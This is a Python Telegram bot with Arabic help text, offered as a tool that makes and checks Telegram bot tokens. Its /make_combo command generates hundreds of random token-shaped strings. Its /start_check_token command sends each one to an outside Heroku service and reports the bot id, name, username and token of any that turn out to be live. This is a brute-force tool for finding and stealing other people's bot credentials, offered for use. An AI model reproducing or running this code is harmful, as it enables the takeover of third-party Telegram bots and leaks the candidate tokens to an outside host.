import requests
from telebot import types
import telebot
from time import sleep
import random
import marshal  
import os

token = input("EnTeR ToKeN BoT : ")
bot = telebot.TeleBot(token)
r=requests.session() 
sty = types.InlineKeyboardButton(text ="- START BoT ",callback_data = 'check')
dev = types.InlineKeyboardButton(text="- Dev 💗 ",url="https://t.me/u_zzf")


@bot.message_handler(commands=['start'])
def start(message):
    use = message.from_user.username
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 4
    maac.add(sty,dev)
    bjj = message.chat.id
    messagee = bot.send_message(message.chat.id,text=f"""<strong>
Hi <code>{fr}</code>, 
- - - - - - - - - - 
اهلا بك في البوت 💁💗
- - - - - - - - - - 
By  : @u_zzf 
</strong>
    """,parse_mode='html',reply_to_message_id=message.message_id, reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == 'check':
    	com(call.message)
def com(message):
    use = message.from_user.username
    us1= message.from_user.first_name
    bot.send_message(message.chat.id,text=f"""<strong>
Hi <code>{message.from_user.first_name}</code>, 
- - - - - - - - - - 
اهلا بك في بوت صنع وفحص توكنات تلكرام 

/make_combo

/start_check_token

/delete

/help (قسم المساعده)
- - - - - - - - - - 
Programming : @Abdulaah_Abd_alsalam 
- - - - - - - - - - 
Ch : @u_zzf
</strong>
    """,parse_mode='html',reply_to_message_id=message.message_id)
@bot.message_handler(commands=['start_check_token'])
def tok1(message):
    bot.send_message(message.chat.id,"please wait ")
    done = 0
    bad = 0
    while True:
        		 		file = open("Token.txt","r").read().splitlines()
        		 		for ac in file:
        		 			url = requests.get(f'https://h-a-m-o.herokuapp.com/hamo/info/?token={ac}').json()
        		 			oo = url["ok"]
        		 			if oo == "True" :
        		 				done +=1
        		 				o = url["id_bot"]
        		 				p = url["name_bot"]
        		 				u = url["username_bot"] 
        		 				bot.send_message(message.chat.id,text=f' {oo}\n\n  Id : {o}\n  name : {p}\n user : {u}\n token : {ac} \n done ✅\n{done}')
        		 			elif oo == 'False':
        		 					bad +=1
        		 					bot.send_message(message.chat.id,text=f' {oo}\n\n" token : {ac} \n\n bad token ❌\n')
        		 					pass
    
    
@bot.message_handler(commands=['make_combo'])
def tok1(message):
    bot.send_message(message.chat.id,text=f'done save combo Token ✅')
    rr='1234567890'
    dd='qQwWeErRtTyYUuiIoOpPaAsSDdfFgGhHjJkKlLzZXxCcVvBbNnMm1234567890-_'
    b= ('2','5')
    bb= ('AAF','AAG')
    for i in range(490):
    	pp=str("".join(random.choice(bb)for i in
    	range(1)))
    	kk=str("".join(random.choice(b)for i in
    	range(1)))
    	k=str("".join(random.choice(rr)for i in
    	range(9)))
    	r=str("".join(random.choice(dd)for i in range(32)))
    	n=(kk+k)
    	    
    	with open('Token.txt', 'a') as x:
    		x.write(n+':'+pp+r+'''
    		''') 
@bot.message_handler(commands=['help'])
def tok1(message):
  bot.send_message(message.chat.id,f""" Hi Pro 🌝💗\n  قسم المساعدة 
    -   -   -   -   -  -  -  -  -  -  -   -   -           
عند ارسال /make_combo  سوف يصنع لك البوت لسته توكنات من خلالها يمكنك تشغيل البوت 
    -   -   -   -   -  -  -  -  -  -  -   -   -        
    وعند ارسال /start_ckeck_token 
    سوف يبدء البوت بالفحص
    -   -   -   -   -  -  -  -  -  -  -   -   -      
    (المساعده ✅💁)  
    
    بعد صنع الكومبو يمكنك الضغط غلى امر  / start_ckeck_token 
    -   -   -   -   -  -  -  -  -  -  -   -   -        
    بعد الضغط على الامر سوف يبدء البوت في الفحص 
    -   -   -   -   -  -  -  -  -  -  -   -   -      
    (ملاحضه مهمه ✳️)
    
    يجب يجب يجب صنع كومبو توكنات قبل ان تبدء الفحص  
    -   -   -   -   -  -  -  -  -  -  -   -   -      
    الامر /delete
    يقوم بحذف ملف الكومبو 
    عند تشغيل البوت مره ثانيه 
    يجب ان تقوم بحذف الكومبو 
    عبر هذا الامر
    الامر مهم جدا جدا 
     -   -   -   -   -  -  -  -  -  -  -   -   -  
    Programming : @Abdulaah_Abd_alsalam 
    -   -   -   -   -  -  -  -  -  -  -   -   -      
    Ch : @u_zzf
    """)
@bot.message_handler(commands=['delete'])
def tok1(message):
        if os.path.exists("Token.txt"):
        	sidf = open("Token.txt", "w")
        	sidf.write('')
        	bot.send_message(message.chat.id, text=' done  delete token  ✅')
  
bot.polling(True)
